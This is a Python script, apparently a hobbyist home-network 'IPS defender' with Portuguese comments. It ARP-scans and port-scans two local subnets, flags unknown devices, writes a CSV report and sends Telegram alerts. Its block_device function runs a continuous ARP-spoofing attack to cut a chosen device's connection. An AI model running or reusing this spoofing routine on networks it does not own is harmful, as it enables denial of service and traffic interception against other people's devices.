from scapy.all import ARP, Ether, srp, send
import socket
import urllib.request
import urllib.parse
import json
import time
import os
import csv
import threading
from concurrent.futures import ThreadPoolExecutor
from dotenv import load_dotenv

load_dotenv()

try:
    import winsound
except ImportError:
    pass

def send_telegram_alert(mensagem):
    """Envia uma mensagem de alerta via Telegram Bot."""
    token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")
    
    if not token or not chat_id:
        print("[-] Aviso: Credenciais do Telegram não configuradas no arquivo .env")
        return
        
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = urllib.parse.urlencode({'chat_id': chat_id, 'text': mensagem}).encode('utf-8')
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req, timeout=3)
    except Exception as e:
        print(f"[-] Erro ao enviar alerta no Telegram: {e}")

def get_local_ip_range():
    """Descobre o IP local e retorna o IP e o bloco /24 assumido."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Não precisa conectar de verdade, apenas para ver a interface usada
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '192.168.1.1'
    finally:
        s.close()
    
    parts = ip.split('.')
    # Assume sub-rede padrão
    network = f"{parts[0]}.{parts[1]}.{parts[2]}.1/24"
    gateway = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
    return network, ip, gateway

def get_vendor(mac_address):
    """Obtém o fabricante do dispositivo com base no endereço MAC usando uma API pública."""
    try:
        url = f"https://api.macvendors.com/{mac_address}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=2) as response:
            return response.read().decode('utf-8')
    except Exception:
        try:
            url = f"https://macvendors.co/api/{mac_address}"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                data = json.loads(response.read().decode('utf-8'))
                if 'result' in data and 'company' in data['result']:
                    return data['result']['company']
        except Exception:
            pass
    return "Desconhecido"

def scan_single_port(ip, port, service, results):
    """Verifica uma única porta (para multithreading)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.2)
    result = sock.connect_ex((ip, port))
    if result == 0:
        results.append(port)
    sock.close()

def scan_ports(ip):
    """Verifica um conjunto de portas usando Threads (muito mais rápido)."""
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 
        53: "DNS", 80: "HTTP", 110: "POP3", 135: "RPC", 
        139: "NetBIOS", 443: "HTTPS", 445: "SMB", 
        3306: "MySQL", 3389: "RDP", 8080: "HTTP-Proxy"
    }
    
    open_port_numbers = []
    
    # Executa até 14 checagens em paralelo
    with ThreadPoolExecutor(max_workers=14) as executor:
        for port, service in common_ports.items():
            executor.submit(scan_single_port, ip, port, service, open_port_numbers)
            
    open_port_numbers.sort()
    
    if not open_port_numbers:
        return "Nenhuma", "Desconhecido"
        
    ports_str = ", ".join([f"{p} ({common_ports[p]})" for p in open_port_numbers])
    
    # Classificação Básica de Sistema Operacional (OS Guessing) baseada em portas típicas
    os_guess = "Desconhecido"
    if 3389 in open_port_numbers or 135 in open_port_numbers or 139 in open_port_numbers or 445 in open_port_numbers:
        os_guess = "Windows"
    elif 22 in open_port_numbers and not (3389 in open_port_numbers):
        os_guess = "Linux/Mac/Router"
        
    return ports_str, os_guess

def carregar_dispositivos_conhecidos():
    if os.path.exists("dispositivos_conhecidos.json"):
        try:
            with open("dispositivos_conhecidos.json", "r") as f:
                data = json.load(f)
                # Normaliza todas as chaves do JSON para MAIÚSCULAS para facilitar o match
                return {k.upper(): v for k, v in data.items()}
        except Exception:
            pass
    print("[i] Sugestão: Crie/edite o arquivo 'dispositivos_conhecidos.json' para cadastrar seus aparelhos!")
    return {}

def block_device(target_ip, gateway_ip, target_mac):
    """Ataque contínuo de ARP Spoofing para desabilitar acesso do alvo ao roteador."""
    print(f"\n[!] INICIANDO BLOQUEIO CONTRA {target_ip} ({target_mac}). Pressione Ctrl+C para parar tudo.")
    try:
        while True:
            # Envenena a tabela ARP do intruso, dizendo que NÓS somos o gateway
            packet_victim = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            send(packet_victim, verbose=False)
            time.sleep(2)
    except Exception as e:
        print(f"Erro na thread de bloqueio: {e}")

def scan_network():
    _, my_ip, _ = get_local_ip_range()
    
    redes_alvo = ["192.168.6.1/24", "192.168.5.1/24"]
    gateways = ["192.168.6.1", "192.168.5.1"]
    redes_ssids = {"192.168.6.1/24": "GHOST", "192.168.5.1/24": "Agostinhacki-Dual"}
    
    print("="*60)
    print("        🛡️ NETWORK MONITOR & IPS DEFENDER 🛡️")
    print("="*60)
    print(f"Seu IP = {my_ip}, Gateways = {', '.join(gateways)}")
    print(f"Escaneando as redes: {', '.join(redes_alvo)}...\n")
    
    result = []
    for ip_range in redes_alvo:
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        try:
            res = srp(packet, timeout=3, verbose=0)[0]
            for sent, received in res:
                result.append((received, ip_range))
        except Exception as e:
            print(f"Erro ao capturar pacotes na rede {ip_range}: {e}")

    clients = []
    dispositivos_conhecidos = carregar_dispositivos_conhecidos()
    intrusos_detectados = []

    print(f"Encontrados {len(result)} dispositivos ativos. Coletando informações (OS, Portas)...")
    
    mac_to_ip = {}
    for received, ip_range in result:
        ip = received.psrc
        mac = received.hwsrc
        ssid = redes_ssids.get(ip_range, "Desconhecida")
        
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = "Desconhecido"
            
        vendor = get_vendor(mac)
        ports_str, os_guess = scan_ports(ip)
        
        # Determina Status de Confiabilidade
        status = "CONHECIDO"
        mac_upper = mac.upper()
        
        # Ignora verificação de clonagem agressiva para dispositivos com múltiplos IPs que você já confiou
        if mac_upper in dispositivos_conhecidos:
            status = dispositivos_conhecidos[mac_upper]
            mac_to_ip[mac_upper] = ip
        elif mac_upper in mac_to_ip and mac_to_ip[mac_upper] != ip:
            status = "ALERTA: MAC CLONADO!"
            intrusos_detectados.append({'ip': ip, 'mac': mac, 'hostname': hostname})
        else:
            mac_to_ip[mac_upper] = ip
            if ip not in gateways and ip != my_ip:
                status = "INTRUSO/NOVO!"
                intrusos_detectados.append({'ip': ip, 'mac': mac, 'hostname': hostname})
            else:
                 status = "Confiável (Local)"
        
        clients.append({
            'ip': ip, 'mac': mac, 'ssid': ssid, 'hostname': hostname, 
            'os': os_guess, 'status': status, 'vendor': vendor, 'ports': ports_str
        })
        time.sleep(0.3)

    # Imprimir Tabela
    print("\nLista de Dispositivos Conectados:")
    print("-" * 170)
    print("{:<16} | {:<18} | {:<18} | {:<20} | {:<15} | {:<20} | {:<20} | {}".format(
        "IP", "MAC", "Rede (SSID)", "Hostname", "OS Provável", "Status", "Fabricante", "Portas Abertas"))
    print("-" * 170)
    
    for client in clients:
        vendor_short = (client['vendor'][:18] + '...') if len(client['vendor']) > 18 else client['vendor']
        hostname_short = (client['hostname'][:18] + '...') if len(client['hostname']) > 18 else client['hostname']
        status_str = client['status']
        if "INTRUSO" in status_str or "CLONADO" in status_str:
            status_str = f"!!! {status_str} !!!" # Destaca o intruso visualmente
            
        print("{:<16} | {:<18} | {:<18} | {:<20} | {:<15} | {:<20} | {:<20} | {}".format(
            client['ip'], client['mac'].upper(), client['ssid'], hostname_short, client['os'], 
            status_str, vendor_short, client['ports']))

    # Exportar para CSV
    csv_file = "relatorio_rede.csv"
    try:
        with open(csv_file, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.DictWriter(file, fieldnames=['ip', 'mac', 'ssid', 'hostname', 'os', 'status', 'vendor', 'ports'])
            writer.writeheader()
            writer.writerows(clients)
        print(f"\n[+] Relatório exportado com sucesso para {os.path.abspath(csv_file)}")
    except Exception as e:
        print(f"\n[-] Erro ao salvar relatório CSV: {e}")

    # Ação Ativa contra Intrusos
    if intrusos_detectados:
        try:
            winsound.Beep(1000, 500)
            winsound.Beep(1000, 500)
        except Exception:
            pass
            
        print("\n" + "!" * 60)
        print(f"ALERTA VERMELHO: Foram detectados {len(intrusos_detectados)} dispositivos desconhecidos no seu WiFi!")
        print("!" * 60)
        
        # Monta a mensagem para o Telegram
        msg_telegram = f"🚨 *ALERTA REDE GHOST/AGOSTINHACKI* 🚨\nForam detectados {len(intrusos_detectados)} dispositivo(s) não autorizado(s):\n\n"
        
        for intruso in intrusos_detectados:
            print(f" -> IP: {intruso['ip']} | MAC: {intruso['mac'].upper()} | Nome: {intruso['hostname']}")
            msg_telegram += f"📡 IP: `{intruso['ip']}`\n"
            msg_telegram += f"🏷️ MAC: `{intruso['mac'].upper()}`\n"
            msg_telegram += f"💻 Nome: {intruso['hostname']}\n\n"
            
        # Dispara o alerta pro celular
        threading.Thread(target=send_telegram_alert, args=(msg_telegram,)).start()
        
        for intruso in intrusos_detectados:
            try:
                import sys
                if not sys.stdin.isatty():
                    print(" [!] Modo background detectado. Bloqueio automático ignorado.")
                    resp = 'n'
                else:
                    resp = input(f"\nDeseja DESTRUIR A CONEXÃO de internet deste dispositivo? ({intruso['ip']})? (s/N): ")
            except (EOFError, RuntimeError):
                resp = 'n'
                
            if resp.lower().strip() == 's':
                alvo_gateway = "192.168.6.1" if intruso['ip'].startswith("192.168.6.") else "192.168.5.1"
                t = threading.Thread(target=block_device, args=(intruso['ip'], alvo_gateway, intruso['mac']))
                t.daemon = True # Encerra a thread se o script principal morrer
                t.start()
                print(f"[*] Escudo Ativado: Envenenando ARP contra {intruso['ip']}. Dispositivo bloqueado com sucesso.")
        
        # Manter o programa vivo se houver scripts de bloqueio rodando em threads
        try:
            threads_ativas = [t for t in threading.enumerate() if t != threading.main_thread()]
            if threads_ativas:
                print("\n[!] Bloqueio(s) Ativo(s)... Deixe esta janela aberta. Pressione Ctrl+C para encerrar os bloqueios e restaurar a internet do invasor.")
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            print("\n[-] Aplicação encerrada. O invasor recuperará o acesso à rede em instantes.")
    else:
        print("\n[+] Nenhum intruso detectado. Rede segura.")

    return clients, intrusos_detectados

if __name__ == "__main__":
    try:
        clients, intrusos = scan_network()
        
        # Envia relatório final para saber se a tarefa rodou com sucesso no background
        msg = f"🔄 *Varredura Concluída*\n\n✅ Status: *Sucesso*\n📱 Total Dispositivos: {len(clients)}\n🛡️ Intrusos Encontrados: {len(intrusos)}"
        # Roda numa thread separada pra não agarrar
        threading.Thread(target=send_telegram_alert, args=(msg,)).start()
        
    except Exception as e:
        erro_msg = f"❌ *FALHA NA VARREDURA*\n\nOcorreu um erro crítico no Network Monitor que impediu a conclusão:\n`{str(e)}`"
        send_telegram_alert(erro_msg)
        print(f"\n[-] Erro Crítico: {e}")